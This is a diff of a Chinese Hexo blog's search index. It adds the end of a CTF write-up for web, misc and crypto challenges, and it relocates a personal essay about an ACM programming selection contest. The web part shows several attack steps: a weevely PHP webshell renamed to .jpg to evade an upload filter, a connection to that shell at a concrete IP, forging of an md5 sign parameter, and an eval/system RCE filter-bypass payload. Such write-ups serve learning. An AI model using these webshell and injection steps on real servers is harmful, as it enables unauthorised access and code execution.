+<p>我这里是linux，没法装蚁剑，这里使用weevely。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">weevely generate 1234 ./114514.php</span><br><span class="line">mv 114514.php 114514.jpg</span><br></pre></td></tr></table></figure>
+<p>提交时使用burp抓包，将后缀再改回php即可。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">weevely http://47.116.24.9:81/upload/114514.php 1234</span><br></pre></td></tr></table></figure>
+<p>进入shell之后</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">cat flag_859421239.txt</span><br></pre></td></tr></table></figure>
+<h3 id="抽奖游戏"><a href="#抽奖游戏" class="headerlink" title="抽奖游戏"></a>抽奖游戏</h3><p>抽奖之后抓包：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ctf4/check.php?tar=12&amp;sign=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.116.24.9</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.116.24.9/ctf4/game.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sign=md5(tar)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+<p>盲猜<code>tar=flag</code>，然后<code>sign=md5(&#39;flag&#39;)=327a6c4304ad5938eaf0efb6cc3e53dc</code></p>
+<p>把<code>GET</code>参数修改后提交即可。</p>
+<h3 id="Rceeeee"><a href="#Rceeeee" class="headerlink" title="Rceeeee"></a>Rceeeee</h3><p>过滤逃逸：     </p>
+<p><code>?data=eval($_GET[1]);&amp;1=system(&#39;ls&#39;);</code>            </p>
+<p>剩下的自己看着办。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="葫芦娃"><a href="#葫芦娃" class="headerlink" title="葫芦娃"></a>葫芦娃</h3><p>解压后改png图片高度。</p>
+<p><img src="/2022/07/21/easiestctf/2.png"></p>
+<h3 id="File-Error"><a href="#File-Error" class="headerlink" title="File_Error"></a>File_Error</h3><p>这是一个zip文件，是一个伪加密。</p>
+<p><img src="/2022/07/21/easiestctf/3.png"></p>
+<h3 id="shark"><a href="#shark" class="headerlink" title="shark"></a>shark</h3><p>题目说flag只靠搜，那就直接搜呗。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat webone.pcap | grep -a flag</span><br></pre></td></tr></table></figure>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>urldecode</p>
+<p><a href="https://www.urldecoder.io/">https://www.urldecoder.io/</a></p>
+<h3 id="栅栏围墙"><a href="#栅栏围墙" class="headerlink" title="栅栏围墙"></a>栅栏围墙</h3><p>栅栏密码</p>
+<p><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p>
+<p>每组字数9</p>
+<h3 id="罗密欧与朱丽叶"><a href="#罗密欧与朱丽叶" class="headerlink" title="罗密欧与朱丽叶"></a>罗密欧与朱丽叶</h3><p>盲文密码、猪圈密码和圣堂武士密码的结合，一个一个解就行。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>crypto</tag>
+        <tag>misc</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>安全项目第一题解答及思路分析</title>
     <url>/2021/10/29/security01.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="解答（四个key及message）："><a href="#解答（四个key及message）：" class="headerlink" title="解答（四个key及message）："></a>解答（四个key及message）：</h1><p>  <img src="/2021/10/29/security01/1.png">         </p>
@@ -2177,69 +2160,6 @@
       </tags>
   </entry>
   <entry>
-    <title>再见，acm</title>
-    <url>/2021/12/26/%E5%86%8D%E8%A7%81%E2%80%94%E2%80%94acm.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>学校上周末和这周末有两场acm选拔赛，上周末因为自己回家没有参加。于是我在今天打算去试试水，看看自己是不是应该在打ctf的同时，把我一年没管的算法竞赛捡起来。</p>
-<p>比赛时间是在12月26日下午1:30~5:00，一共有10道题。众所周知acm没有部分分，排名是按照做题时间与罚时来算的。我在这个下午AC了4道题，排名16/35，然而前14名才能晋级。</p>
-<p>于是，这是我在大学打的第一场acm，也大概是最后一场了。</p>
-<span id="more"></span>
-<h1 id="游记内容"><a href="#游记内容" class="headerlink" title="游记内容"></a>游记内容</h1><h2 id="当天上午"><a href="#当天上午" class="headerlink" title="当天上午"></a>当天上午</h2><p>就写了两个板子，一个dijkstra，一个线段树。</p>
-<p>dijkstra犯的几个错误（一年没写了，记不得也正常）</p>
-<ul>
-<li>vis数组应该判断u，而不是判断v。</li>
-<li>make_pair搞忘了，编译通不过。</li>
-</ul>
-<p>线段树犯的几个错误</p>
-<ul>
-<li>忘记建树</li>
-<li>忘记pushdown怎么写</li>
-</ul>
-<p><del>然而我并没有忘记把数组和懒标记开4倍。</del></p>
-<p>午饭前得知可以带算法竞赛的书，也可以带纸质代码，可惜没时间准备了。</p>
-<p>下午准备摸鱼。</p>
-<h2 id="当天下午"><a href="#当天下午" class="headerlink" title="当天下午"></a>当天下午</h2><p>题目链接：<a href="https://vjudge.net/contest/474375">https://vjudge.net/contest/474375</a></p>
-<p>A题我本来想打表的，但是一看一群人瞬间就A了，再看看样例，规律很明显。直接$(n+1)/10$搞定，没有什么坑点。（CF评级800）</p>
-<p>接下来看B题，B题看上去像道数学题，仔细一看是个背包。但是我已经有一年没写背包了，我早已经忘了怎么写。我去了趟厕所，想掏出手机复习一下，想想还是算了——反正我就是个摸鱼的。</p>
-<p>在思考B题的同时，排行榜里已经有一堆人A了C题，但是我没管。直到我想了40分钟也没有一个时间复杂度正确的做法后，我终于暂时放掉了B题。</p>
-<p>C题果然是个签到题，简单贪心，没什么好说的。（CF评级800）</p>
-<p>然后G题A的人也比较多，然后我发现这道题是一眼题，要求的dijkstra我上午才写过，20分钟就A了。（CF评级1600）</p>
-<blockquote>
-<p>思路就是对s和t分别求遍单源最短路，然后比较$min(dis1[i]+1+dis2[j],dis1[j]+1+dis2[i])$是否等于1。如果是那么加边就符合条件。</p>
-</blockquote>
-<p>这个时候我rk12.</p>
-<p>然后回过头来思考B题，经过了一个小时的挣扎后，我证明了自己的$O(m^2)$的做法是错误的，然后重新构思了一个$O(m^3)$的做法。</p>
-<blockquote>
-<p>我之前的$O(m^2)$做法是把相同数的不同倍数处理成一个0/1背包，比如说有三个2，那么背包就为2 4 6.但是这样做，你选择的背包就有可能超过2的个数.比如说当m=12，这种算法会把2 4 6都选上，也就是你选了6个2，这当然是错误的。</p>
-<p>我的改进方法是0/1分组背包，首先循环最外层是对组数进行枚举，中间层就是对相同数的不同倍数进行枚举，最后一层枚举背包体积。</p>
-<p>我唯一做的一个优化就是如果在某一组结束之后已经枚举出和为0的方案，就直接break。</p>
-</blockquote>
-<p>当m=1000的时候，这是个复杂度错误的做法，没想到我就刚好卡过了，1700ms/2000ms。</p>
-<p><del>事后证明这个题要专门构造数据卡复杂度错误的做法也不是很容易，因此这种做法也是完全正确滴！</del>正解的标签是dp，数据结构，组合数学和双指针，我完全搞不懂。（CF评级1900，还是比较高了）</p>
-<p>这个时候我rk10.</p>
-<p>然后我再看了下排行榜，发现F题和J题A的人比较多。F题让我想起了今年CSP的t1，而J题是个构造题，于是我义无反顾地选择了J题。</p>
-<p>J题我花了半个小时写完了，交上去WA on case 5，佛了。找半天找不出错，于是我打算写一个spj。</p>
-<p>因为spj和checker也有一年没有写过了，因此我花了一个小时才写好，结果自己写的spj又不知道哪儿出锅了，次长边的长度始终是0.</p>
-<p>这个时候我rk14.</p>
-<p>我觉得我不能再浪费时间在spj上了，于是我开始自己写数据自己肉眼判错。终于在比赛结束前15min发现了一个错误，用了5min改好，再次提交。</p>
-<p>结果还是WA掉了。</p>
-<p>剩下10min我躺平了，我看到我从rk14掉到了rk16，接受着自己算法竞赛就地退役的现实。</p>
-<p>像上次强网杯那样的晋级奇迹应该不会再发生了吧，毕竟有10个人都能A掉四道题。</p>
-<h1 id="事后"><a href="#事后" class="headerlink" title="事后"></a>事后</h1><p>稍微有一点可惜，因为F题也是一道贪心，CF评级是1500，比J题的1600还简单一点，有一点亏。</p>
-<p>关键是J题我判定的特殊情况(d=h)中，有一类特殊情况中的特殊情况(d=h=1)，不能使用这种我10min中前的修正方法判定。更坑的事情是，d=h=1的情况在我之前的代码是完全正确的，导致我完全忽略了在这里翻车的可能。</p>
-<p>只不过——</p>
-<p>听acheing(rk2)说，选上的人要补之前的算法作业。我认为，即使我侥幸进入了前14名，由于学校的代表队也就那么几个人，自己也就是个打酱油的，没必要在acm队里面瞎参合。</p>
-<p>所以这究竟是一种幸运还是不幸呢？或许我就差那么一点进队，大概也是一种天意吧。我更应该干的事情是学好自己的专业，而不是尝试“脚踏两只船”，把自己弄得太疲惫。</p>
-<p>所以——</p>
-<p>さようなら，acm</p>
-]]></content>
-      <categories>
-        <category>OI</category>
-      </categories>
-      <tags>
-        <tag>cpp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(转载) 《茸雪》讲稿</title>
     <url>/2021/12/19/%E3%80%8A%E8%8C%B8%E9%9B%AA%E3%80%8B%E8%AE%B2%E7%A8%BF.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="《茸雪》讲稿"><a href="#《茸雪》讲稿" class="headerlink" title="《茸雪》讲稿"></a>《茸雪》讲稿</h1><p>反乌托邦的爱情，存在主义的自由、反抗。</p>
@@ -2379,6 +2299,69 @@
       <categories>
         <category>随笔</category>
       </categories>
+  </entry>
+  <entry>
+    <title>再见，acm</title>
+    <url>/2021/12/26/%E5%86%8D%E8%A7%81%E2%80%94%E2%80%94acm.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>学校上周末和这周末有两场acm选拔赛，上周末因为自己回家没有参加。于是我在今天打算去试试水，看看自己是不是应该在打ctf的同时，把我一年没管的算法竞赛捡起来。</p>
+<p>比赛时间是在12月26日下午1:30~5:00，一共有10道题。众所周知acm没有部分分，排名是按照做题时间与罚时来算的。我在这个下午AC了4道题，排名16/35，然而前14名才能晋级。</p>
+<p>于是，这是我在大学打的第一场acm，也大概是最后一场了。</p>
+<span id="more"></span>
+<h1 id="游记内容"><a href="#游记内容" class="headerlink" title="游记内容"></a>游记内容</h1><h2 id="当天上午"><a href="#当天上午" class="headerlink" title="当天上午"></a>当天上午</h2><p>就写了两个板子，一个dijkstra，一个线段树。</p>
+<p>dijkstra犯的几个错误（一年没写了，记不得也正常）</p>
+<ul>
+<li>vis数组应该判断u，而不是判断v。</li>
+<li>make_pair搞忘了，编译通不过。</li>
+</ul>
+<p>线段树犯的几个错误</p>
+<ul>
+<li>忘记建树</li>
+<li>忘记pushdown怎么写</li>
+</ul>
+<p><del>然而我并没有忘记把数组和懒标记开4倍。</del></p>
+<p>午饭前得知可以带算法竞赛的书，也可以带纸质代码，可惜没时间准备了。</p>
+<p>下午准备摸鱼。</p>
+<h2 id="当天下午"><a href="#当天下午" class="headerlink" title="当天下午"></a>当天下午</h2><p>题目链接：<a href="https://vjudge.net/contest/474375">https://vjudge.net/contest/474375</a></p>
+<p>A题我本来想打表的，但是一看一群人瞬间就A了，再看看样例，规律很明显。直接$(n+1)/10$搞定，没有什么坑点。（CF评级800）</p>
+<p>接下来看B题，B题看上去像道数学题，仔细一看是个背包。但是我已经有一年没写背包了，我早已经忘了怎么写。我去了趟厕所，想掏出手机复习一下，想想还是算了——反正我就是个摸鱼的。</p>
+<p>在思考B题的同时，排行榜里已经有一堆人A了C题，但是我没管。直到我想了40分钟也没有一个时间复杂度正确的做法后，我终于暂时放掉了B题。</p>
+<p>C题果然是个签到题，简单贪心，没什么好说的。（CF评级800）</p>
+<p>然后G题A的人也比较多，然后我发现这道题是一眼题，要求的dijkstra我上午才写过，20分钟就A了。（CF评级1600）</p>
+<blockquote>
+<p>思路就是对s和t分别求遍单源最短路，然后比较$min(dis1[i]+1+dis2[j],dis1[j]+1+dis2[i])$是否等于1。如果是那么加边就符合条件。</p>
+</blockquote>
+<p>这个时候我rk12.</p>
+<p>然后回过头来思考B题，经过了一个小时的挣扎后，我证明了自己的$O(m^2)$的做法是错误的，然后重新构思了一个$O(m^3)$的做法。</p>
+<blockquote>
+<p>我之前的$O(m^2)$做法是把相同数的不同倍数处理成一个0/1背包，比如说有三个2，那么背包就为2 4 6.但是这样做，你选择的背包就有可能超过2的个数.比如说当m=12，这种算法会把2 4 6都选上，也就是你选了6个2，这当然是错误的。</p>
+<p>我的改进方法是0/1分组背包，首先循环最外层是对组数进行枚举，中间层就是对相同数的不同倍数进行枚举，最后一层枚举背包体积。</p>
+<p>我唯一做的一个优化就是如果在某一组结束之后已经枚举出和为0的方案，就直接break。</p>
+</blockquote>
+<p>当m=1000的时候，这是个复杂度错误的做法，没想到我就刚好卡过了，1700ms/2000ms。</p>
+<p><del>事后证明这个题要专门构造数据卡复杂度错误的做法也不是很容易，因此这种做法也是完全正确滴！</del>正解的标签是dp，数据结构，组合数学和双指针，我完全搞不懂。（CF评级1900，还是比较高了）</p>
+<p>这个时候我rk10.</p>
+<p>然后我再看了下排行榜，发现F题和J题A的人比较多。F题让我想起了今年CSP的t1，而J题是个构造题，于是我义无反顾地选择了J题。</p>
+<p>J题我花了半个小时写完了，交上去WA on case 5，佛了。找半天找不出错，于是我打算写一个spj。</p>
+<p>因为spj和checker也有一年没有写过了，因此我花了一个小时才写好，结果自己写的spj又不知道哪儿出锅了，次长边的长度始终是0.</p>
+<p>这个时候我rk14.</p>
+<p>我觉得我不能再浪费时间在spj上了，于是我开始自己写数据自己肉眼判错。终于在比赛结束前15min发现了一个错误，用了5min改好，再次提交。</p>
+<p>结果还是WA掉了。</p>
+<p>剩下10min我躺平了，我看到我从rk14掉到了rk16，接受着自己算法竞赛就地退役的现实。</p>
+<p>像上次强网杯那样的晋级奇迹应该不会再发生了吧，毕竟有10个人都能A掉四道题。</p>
+<h1 id="事后"><a href="#事后" class="headerlink" title="事后"></a>事后</h1><p>稍微有一点可惜，因为F题也是一道贪心，CF评级是1500，比J题的1600还简单一点，有一点亏。</p>
+<p>关键是J题我判定的特殊情况(d=h)中，有一类特殊情况中的特殊情况(d=h=1)，不能使用这种我10min中前的修正方法判定。更坑的事情是，d=h=1的情况在我之前的代码是完全正确的，导致我完全忽略了在这里翻车的可能。</p>
+<p>只不过——</p>
+<p>听acheing(rk2)说，选上的人要补之前的算法作业。我认为，即使我侥幸进入了前14名，由于学校的代表队也就那么几个人，自己也就是个打酱油的，没必要在acm队里面瞎参合。</p>
+<p>所以这究竟是一种幸运还是不幸呢？或许我就差那么一点进队，大概也是一种天意吧。我更应该干的事情是学好自己的专业，而不是尝试“脚踏两只船”，把自己弄得太疲惫。</p>
+<p>所以——</p>
+<p>さようなら，acm</p>
+]]></content>
+      <categories>
+        <category>OI</category>
+      </categories>
+      <tags>
+        <tag>cpp</tag>
+      </tags>
   </entry>
   <entry>
     <title>十九——热爱杀105个人的你</title>
